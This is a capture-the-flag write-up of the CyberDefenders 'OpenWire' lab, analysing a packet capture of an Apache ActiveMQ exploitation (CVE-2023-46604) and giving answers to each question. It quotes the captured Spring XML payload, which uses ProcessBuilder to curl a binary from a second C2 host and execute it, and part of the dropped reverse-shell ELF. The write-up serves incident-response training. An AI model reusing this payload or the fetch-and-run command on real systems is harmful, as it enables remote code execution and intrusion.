---
title: '[Cyberdefenders] - OpenWire'
date: '07/04/2024'
lastmod: '07/04/2024'
tags: ['Network Analysis', 'PCAP', 'CVEs']
summary: 'Here is my writeup for OpenWire that I completed on Cyberdefenders.'
draft: false
author: ['H4shBadG']
---

# Summary

During your shift as a tier-2 SOC analyst, you receive an escalation from a tier-1 analyst regarding a public-facing server. This server has been flagged for making outbound connections to multiple suspicious IPs. In response, you initiate the standard incident response protocol, which includes isolating the server from the network to prevent potential lateral movement or data exfiltration and obtaining a packet capture from the NSM utility for analysis. Your task is to analyze the pcap and assess for signs of malicious activity.

## Q1 - By identifying the C2 IP, we can block traffic to and from this IP, helping to contain the breach and prevent further data exfiltration or command execution. Can you provide the IP of the C2 server that communicated with our server?

During the analysis of the PCAP file, I came across this communication :

```
GET /invoice.xml HTTP/1.1
Cache-Control: no-cache
Pragma: no-cache
User-Agent: Java/11.0.21
Host: 146.190.21.92:8000
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.8.10
Date: Tue, 12 Dec 2023 13:38:28 GMT
Content-type: application/xml
Content-Length: 816
Last-Modified: Tue, 12 Dec 2023 13:37:45 GMT

<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg >
            <list>
                <!--value>open</value>
                <value>-a</value>
                <value>calculator</value -->
                <value>bash</value>
                <value>-c</value>
                <value>curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

I identified 2 details that bring my attention such as the User-Agent being SimpleHTTP from Python module and the fact that it get an XML file. The second fact is very suspicious as we can observe in the TCP Stream N*0 that the victim server is running Spring Framework ([which is updated by an XML...](https://docs.spring.io/spring-framework/docs/4.2.x/spring-framework-reference/html/xsd-configuration.html)) :

```
Borg.springframework.context.support.ClassPathXmlApplicationContext..%http://146.190.21.92:8000/invoice.xml
```

Response : 146.190.21.92

## Q2 - Initial entry points are critical to trace back the attack vector. What is the port number of the service the adversary exploited?

Looking through the first packets of the PCAP, I found the following packets.

```
...R.ActiveMQ........@...
..StackTraceEnabled....PlatformDetails	..Java..CacheEnabled....TcpNoDelayEnabled....SizePrefixDisabled...	CacheSize.......ProviderName	..ActiveMQ..TightEncodingEnabled....MaxFrameSize......@....MaxInactivityDuration.......u0. MaxInactivityDurationInitalDelay.......'...MaxFrameSizeEnabled....ProviderVersion	..5.18.0.
```

These communication seems to execute a loading of the XML on the C2 (look at the packet 92)

Response: 61616

## Q3 - Following up on the previous question, what is the name of the service found to be vulnerable?

Looking at the header of the attack, I have seen some name :

```
..R.ActiveMQ........@...
```

With little research, ActiveMQ is a service provided by [Apache](https://activemq.apache.org/)

Response: Apache ActiveMQ

## Q4 - The attacker's infrastructure often involves multiple components. What is the IP of the second C2 server?

In the second phase of the attack, we can see a second IP used to retrieve a reverse shell. Like this communication :

```
GET /docker HTTP/1.1
Host: 128.199.52.72
User-Agent: curl/7.68.0
Accept: */*

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.8.10
Date: Tue, 12 Dec 2023 13:38:28 GMT
Content-type: application/octet-stream
Content-Length: 250
Last-Modified: Tue, 12 Dec 2023 12:23:04 GMT

.ELF..............>.....x.@.....@...................@.8...........................@.......@.............|...............1.j	X...H..M1.j"AZj.Z..H..xQj
AYPj)X.j._j.^..H..x;H.H........\QH..j.Zj*X..YH..y%I..t.Wj#Xj.j.H..H1...YY_H..y.j<Xj._..^j~Z..H..x...
```

Response : 128.199.52.72

## Q5 - Attackers usually leave traces on the disk. What is the name of the reverse shell executable dropped on the server?

Getting the reverse shell through HTTP exportable objects, I got some ELF executable named docker. Howerever it seems quite empty but it's the only file getting grabbed from the new C2.

Response: Docker

## Q6 - What Java class was invoked by the XML file to run the exploit?

The answer to this question is explained in this article and can be viewed in the packet 14 :

```
 <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
 ```

Response: java.lang.ProcessBuilder

## Q7 - To better understand the specific security flaw exploited, can you identify the CVE identifier associated with this vulnerability?

Asking the internet, this attack seems related to [this one](https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/)

Response: CVE-2023-46604

## Q8 - What is the vulnerable Java method and class that allows an attacker to run arbitrary code? (Format: Class.Method)

Looking at this same article, the vulnerability is explained and the vulnerable method is inherited from the `validateIsThrowable` function.

Response: BaseDataStreamMarshaller.createThrowable